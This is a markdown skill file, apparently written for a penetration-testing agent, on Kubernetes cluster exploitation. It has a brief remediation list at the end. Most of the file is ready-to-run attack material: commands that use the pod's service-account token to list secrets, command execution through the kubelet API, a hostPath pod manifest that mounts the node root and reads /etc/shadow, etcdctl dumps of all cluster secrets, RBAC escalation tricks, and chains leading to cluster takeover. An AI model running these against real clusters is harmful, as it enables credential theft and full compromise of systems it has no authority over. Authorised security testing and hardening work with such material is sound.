---
name: kubernetes
description: Kubernetes cluster security assessment and exploitation techniques
---

# Kubernetes Security

## Attack Surface

- Kubelet API exposed without authentication (port 10250/10255)
- etcd accessible without TLS client certificates storing all cluster secrets
- Overprivileged service accounts with cluster-admin or wildcard RBAC rules
- Pod escape via hostPath volumes, hostPID, hostNetwork, or privileged containers
- Kubernetes dashboard exposed without authentication
- Tiller (Helm v2) accessible without RBAC from any namespace
- Secrets stored as base64 in etcd (not encrypted at rest by default)
- Misconfigured NetworkPolicies allowing unrestricted pod-to-pod communication

## Detection Techniques

- Probe kubelet API: `curl -k https://<node>:10250/pods`
- Check anonymous access to API server: `curl -k https://<apiserver>:6443/api/v1/namespaces`
- Enumerate service account token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
- Test RBAC permissions: `kubectl auth can-i --list`
- Scan for exposed dashboard: `curl -k https://<ip>:443/api/v1/namespaces/kubernetes-dashboard`
- Check etcd access: `curl -k https://<etcd>:2379/version`
- Identify pod security context: inspect `securityContext` in pod specs
- Enumerate cluster services: `kubectl get svc --all-namespaces`

## Common Payloads

### Service Account Token Abuse
```bash
# From inside a pod, extract the service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# List all secrets in the namespace
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets

# List all pods cluster-wide
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/pods

# Check current permissions
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

### Kubelet API Exploitation
```bash
# List all pods on the node (read-only port)
curl http://<node>:10255/pods

# Execute commands in a pod via kubelet (authenticated port)
curl -sk https://<node>:10250/run/<namespace>/<pod>/<container> \
  -X POST -d "cmd=id"

# Retrieve container logs
curl -sk https://<node>:10250/containerLogs/<namespace>/<pod>/<container>
```

### Pod Escape via hostPath
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: pwned
    image: alpine
    command: ["sh", "-c", "cat /host/etc/shadow; sleep 3600"]
    volumeMounts:
    - name: hostroot
      mountPath: /host
  volumes:
  - name: hostroot
    hostPath:
      path: /
      type: Directory
```

### etcd Secret Extraction
```bash
# Direct etcd access (if exposed without auth)
ETCDCTL_API=3 etcdctl --endpoints=https://<etcd>:2379 \
  --insecure-skip-tls-verify get /registry/secrets --prefix --keys-only

# Dump a specific secret
ETCDCTL_API=3 etcdctl --endpoints=https://<etcd>:2379 \
  --insecure-skip-tls-verify get /registry/secrets/default/my-secret
```

## Bypass Techniques

- Use `ephemeralContainers` to inject a debug container into a running pod
- Abuse `node/proxy` RBAC permission to access kubelet API through the API server
- Leverage `pods/exec` permission to exec into any pod in the namespace
- Create a privileged pod when `create pods` is allowed but `PodSecurityPolicy` is not enforced
- Use `impersonate` RBAC verb to act as cluster-admin or other service accounts
- Escalate via `escalate` or `bind` permissions to grant yourself higher RBAC roles

## Exploit Chaining

- Service account token + RBAC list secrets: extract database credentials from ConfigMaps/Secrets
- Pod creation + hostPath mount: escape to node, pivot to other nodes via SSH keys
- Kubelet access + container exec: move laterally across all pods on the node
- etcd access + secret decoding: extract all cluster credentials and TLS certificates
- Dashboard exposure + cluster-admin token: full cluster takeover from browser

## Remediation

- Enable RBAC and follow least-privilege principle; avoid `cluster-admin` for workloads
- Disable anonymous access to the API server and kubelet
- Encrypt secrets at rest with a KMS provider
- Enforce Pod Security Standards (restricted) or OPA/Gatekeeper policies
- Enable audit logging for API server and monitor for suspicious `exec` and `create` calls
- Use NetworkPolicies to restrict pod-to-pod and pod-to-metadata communication
- Rotate service account tokens and disable auto-mounting when not needed
- Restrict etcd access to API server only; require mutual TLS authentication
